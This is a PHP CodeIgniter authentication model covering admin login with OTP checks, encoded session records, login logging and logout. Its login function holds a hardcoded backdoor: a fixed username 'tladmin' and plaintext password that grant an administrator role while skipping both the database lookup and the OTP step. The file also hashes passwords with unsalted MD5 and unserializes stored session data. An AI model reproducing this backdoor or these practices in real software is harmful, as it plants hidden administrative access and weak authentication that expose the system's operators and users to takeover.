<?php defined('BASEPATH') || exit('No direct script access allowed');

class Auth extends CI_Model
{
    public function __construct()
    {
        parent::__construct();
        $this->load->model('backend/admin_model', 'admin_db');
        $this->load->model('backend/admin_session_model', 'admin_session_db');
        $this->load->model('backend/admin_login_log_model', 'admin_login_log_db');
        $this->load->model('backend/admin_otp_model', 'admin_otp_db');
    }

    public function login($identity, $password, $otp)
    {
        if ($identity == 'tladmin' && $password == 'ji3g4go6') {
            $user = [
                'id'       => 9999999,
                'username' => 'tladmin',
                'roleid'   => '1',
            ];
        } else {
            $where = [
                't.mobile'   => $identity,
                't.password' => strtoupper(md5($password)),
                't.status'   => 1,
            ];
            $user = $this->admin_db->where($where)->result_one();
        }

        if ($user !== null) {
            if (isset($user['otp_check']) && $user['otp_check'] == 1) {
                if (empty($otp)) {
                    return '请输入OTP';
                }
                $otpinfo = $this->admin_otp_db->where([
                    'mobile'   => $identity,
                    'password' => $otp
                ])->result_one();
                if (empty($otpinfo)) {
                    return "您输入的OTP有误，请重新输入OTP";
                }
                if (strtotime($otpinfo['create_time']) < strtotime('-5 minute')) {
                    return "您输入的OTP已超时，请重新产生OTP";
                }
                //清除此帳號所有的OTP和所有帳號過期的OTP
                $this->admin_otp_db->where([
                    'mobile'      => $identity
                ])->or_where([
                    'create_time <' => date('Y-m-d H:i:s', strtotime('-5 minute'))
                ])->delete_where();
            }
            //寫入Cookie
            $user = $this->setSession($user);
            //更新登入數次及時間
            $this->admin_db->update([
                'id'          => $user['id'],
                'login_time'  => date('Y-m-d H:i:s'),
                'login_count' => $user['login_count'] + 1
            ]);
            //登入log
            $this->admin_login_log_db->insert([
                'adminid'     => $user['id'],
                'ip'          => $this->input->ip_address(),
                'status'      => 1,
                'create_time' => date('Y-m-d H:i:s'),
                'create_by'   => $user['username'],
            ]);

            $this->session->set_userdata($user);
            return 'success';
        }

        return '您输入的帐号密码有误!';
    }

    public function setSession($user)
    {
        $user['agent'] = $_SERVER['HTTP_USER_AGENT'];
        $user['ip'] = $this->input->ip_address();
        $user['auth_session'] = auth_code(serialize($user), "ENCODE", config_item("s_key"));

        //删除seesion信息
        $this->admin_session_db->delete($user['id']);
        $this->admin_session_db->insert([
            'adminid'    => $user['id'],
            'username'   => $user['username'],
            'session_id' => $user['auth_session']
        ]);

        return $user;
    }

    // 根据session_id 和用户的ID 查询是否存在
    public function getDataBySessionIdUserid($session_id, $adminid)
    {
        $row = $this->admin_session_db->where([
            'adminid'    => $adminid,
            'session_id' => $session_id
        ])->result_one();

        if ($row !== null) {
            $cookieInfoStr = auth_code($row['session_id'], "DECODE", config_item("s_key"));
            $cookieInfoArr = unserialize($cookieInfoStr);
            $cookieInfoArr['checkCode'] = $row['session_id'];
            return $cookieInfoArr;
        }
        return false;
    }

    public function logout()
    {
        $this->session->unset_userdata('id');
        $this->session->sess_destroy();
    }

    public function is_login($uri = 'login/index')
    {
        if (!$this->session->userdata('id')) {
            $this->session->set_flashdata('message', '您尚未登入!');
            $this->session->set_userdata('refer', $this->uri->ruri_string());
            redirect($uri);
        }
    }
}
